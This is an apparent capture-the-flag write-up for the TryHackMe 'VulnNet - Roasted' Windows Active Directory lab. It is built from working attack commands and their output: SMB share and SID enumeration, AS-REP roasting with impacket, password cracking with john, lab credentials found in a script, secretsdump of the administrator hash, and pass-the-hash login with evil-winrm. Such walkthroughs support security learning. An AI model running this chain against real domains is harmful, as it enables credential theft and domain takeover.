# VulnNet - Roasted

Author: THM
Difficulty: 2
Key takeaway: Always try secretsdump if you have a set of credentials
Tags: GetNPUsers, GetUserSPNs, active directory, lookupsuid, secretsdump
Type: Windows

# Enumeration

- portscan

```bash
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-12-26 17:36:13Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49665/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc         Microsoft Windows RPC
49685/tcp open  msrpc         Microsoft Windows RPC
49697/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: WIN-2BO8M1OE1M1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 1s
| smb2-time: 
|   date: 2021-12-26T17:37:12
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Dec 26 12:37:52 2021 -- 1 IP address (1 host up) scanned in 111.42 seconds
```

- found 3 readable shares by anonymous user

```powershell
/usr/share/enum4linux » crackmapexec smb 10.10.230.189 -u kali -p '' --shares                             kali@kali
SMB         10.10.230.189   445    WIN-2BO8M1OE1M1  [*] Windows 10.0 Build 17763 x64 (name:WIN-2BO8M1OE1M1) (domain:vulnnet-rst.local) (signing:True) (SMBv1:False)
SMB         10.10.230.189   445    WIN-2BO8M1OE1M1  [+] vulnnet-rst.local\kali: 
SMB         10.10.230.189   445    WIN-2BO8M1OE1M1  [+] Enumerated shares
SMB         10.10.230.189   445    WIN-2BO8M1OE1M1  Share           Permissions     Remark
SMB         10.10.230.189   445    WIN-2BO8M1OE1M1  -----           -----------     ------
SMB         10.10.230.189   445    WIN-2BO8M1OE1M1  ADMIN$                          Remote Admin
SMB         10.10.230.189   445    WIN-2BO8M1OE1M1  C$                              Default share
SMB         10.10.230.189   445    WIN-2BO8M1OE1M1  IPC$            READ            Remote IPC
SMB         10.10.230.189   445    WIN-2BO8M1OE1M1  NETLOGON                        Logon server share 
SMB         10.10.230.189   445    WIN-2BO8M1OE1M1  SYSVOL                          Logon server share 
SMB         10.10.230.189   445    WIN-2BO8M1OE1M1  VulnNet-Business-Anonymous READ            VulnNet Business Sharing
SMB         10.10.230.189   445    WIN-2BO8M1OE1M1  VulnNet-Enterprise-Anonymous READ            VulnNet Enterprise Sharing
```

- Alexa Whitehat - Core business manager
- Jake Goldenhand
- Tony Skid
- Johnny Leet
- using impacket-lookupsuid to check for anonymous domain users

```powershell
impacket-lookupsuid anonymous@<target-ip> | tee users.txt
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Brute forcing SIDs at 10.10.230.189
[*] StringBinding ncacn_np:10.10.230.189[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-1589833671-435344116-4136949213
498: VULNNET-RST\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: VULNNET-RST\Administrator (SidTypeUser)
501: VULNNET-RST\Guest (SidTypeUser)
502: VULNNET-RST\krbtgt (SidTypeUser)
512: VULNNET-RST\Domain Admins (SidTypeGroup)
513: VULNNET-RST\Domain Users (SidTypeGroup)
514: VULNNET-RST\Domain Guests (SidTypeGroup)
515: VULNNET-RST\Domain Computers (SidTypeGroup)
516: VULNNET-RST\Domain Controllers (SidTypeGroup)
517: VULNNET-RST\Cert Publishers (SidTypeAlias)
518: VULNNET-RST\Schema Admins (SidTypeGroup)
519: VULNNET-RST\Enterprise Admins (SidTypeGroup)
520: VULNNET-RST\Group Policy Creator Owners (SidTypeGroup)
521: VULNNET-RST\Read-only Domain Controllers (SidTypeGroup)
522: VULNNET-RST\Cloneable Domain Controllers (SidTypeGroup)
525: VULNNET-RST\Protected Users (SidTypeGroup)
526: VULNNET-RST\Key Admins (SidTypeGroup)
527: VULNNET-RST\Enterprise Key Admins (SidTypeGroup)
553: VULNNET-RST\RAS and IAS Servers (SidTypeAlias)
571: VULNNET-RST\Allowed RODC Password Replication Group (SidTypeAlias)
572: VULNNET-RST\Denied RODC Password Replication Group (SidTypeAlias)
1000: VULNNET-RST\WIN-2BO8M1OE1M1$ (SidTypeUser)
1101: VULNNET-RST\DnsAdmins (SidTypeAlias)
1102: VULNNET-RST\DnsUpdateProxy (SidTypeGroup)
1104: VULNNET-RST\enterprise-core-vn (SidTypeUser)
1105: VULNNET-RST\a-whitehat (SidTypeUser)
1109: VULNNET-RST\t-skid (SidTypeUser)
1110: VULNNET-RST\j-goldenhand (SidTypeUser)
1111: VULNNET-RST\j-leet (SidTypeUser)
```

- so the naming convention is firstname’s initial-lastname
- creating a wordlist based on that

```powershell
~/thm/vuln-roasted » impacket-GetNPUsers -no-pass vulnnet-rst.local/ -usersfile usernames.txt -format hashcat -outputfile hashes.txt                                                                                           kali@kali
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[-] User a-whitehat doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User j-goldenhand doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User j-leet doesn't have UF_DONT_REQUIRE_PREAUTH set
```

- and we got hash for t-skid’s account
- cracking it using john

```powershell
~/thm/vuln-roasted » john hashes.txt -w=/usr/share/wordlists/rockyou.txt                                                                                                                                                       kali@kali
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
**tj072889***        ($krb5asrep$23$t-skid@VULNNET-RST.LOCAL)     
1g 0:00:00:05 DONE (2022-01-01 09:46) 0.1851g/s 588610p/s 588610c/s 588610C/s tj3929..tj0216044
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

- Found creds in ResetPassword.vbs script

```powershell
strUserNTName = "a-whitehat"                                                                                                                                                                                                             
strPassword = "bNdKVkjv3RR9ht"
```

# Initial Access

- a-whitehat has access to C$ and ADMIN$ shares
- although we are not allowed to list directories inside ADMIN\Desktop
- neither are we allowed to read system.txt inside Administrator\Desktop
- using impacket-secretsdump to dump admin hash

```powershell
impacket-secretsdump vulnnet-rst.local/a-whitehat:'bNdKVkjv3RR9ht'@10.10.183.242 -outputfile hash.txt
```

- used admin hash to login using evil-winrm

```powershell
evil-winrm -i 10.10.183.242 -u administrator -H "<hash>"
```

# Privilege Escalation

# Notes

-